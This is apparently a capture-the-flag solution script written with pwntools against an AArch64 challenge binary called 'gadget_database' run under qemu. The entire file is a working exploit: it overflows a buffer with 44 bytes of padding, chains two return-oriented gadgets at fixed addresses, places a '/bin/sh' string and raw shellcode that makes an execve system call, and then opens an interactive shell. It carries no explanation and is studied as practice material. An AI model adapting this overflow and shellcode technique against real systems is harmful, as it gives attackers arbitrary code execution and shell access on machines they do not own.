#!/usr/bin/env python3
from pwn import *

elf = exe = context.binary = ELF(args.EXE or './gadget_database')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        # return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        return process( "qemu-aarch64-static -g 2020 ./gadget_database".split() ) # -ex "b *main+152"
    else:
        return process( "qemu-aarch64-static ./gadget_database".split() )
        # return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+152
c
'''.format(**locals())

io = start()

io.sendline(b"RS{REALFLAG}")

# https://shell-storm.org/online/Online-Assembler-and-Disassembler
shell = b"\xe0\x03\x00\x91\xa8\x1b\x80\xd2\x01\x00\x00\xd4" # mov x0, sp ; mov x8, #0xdd ; svc #0

payload  = b"A" * 44
payload += p64( 0x0000000000418508 ) # mov x0, x20 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x40 ; ret
payload += b"A" * 8
payload += p64( 0x000000000044b6e4 ) # mov x16, x0 ; br x16 ;
binsh = b"/bin/sh\0"

payload += b"L" * ( 8*6 )
payload += binsh
payload += b"L" * ( 8*46 )

payload += shell

io.sendlineafter(b"query\n", payload )

io.interactive()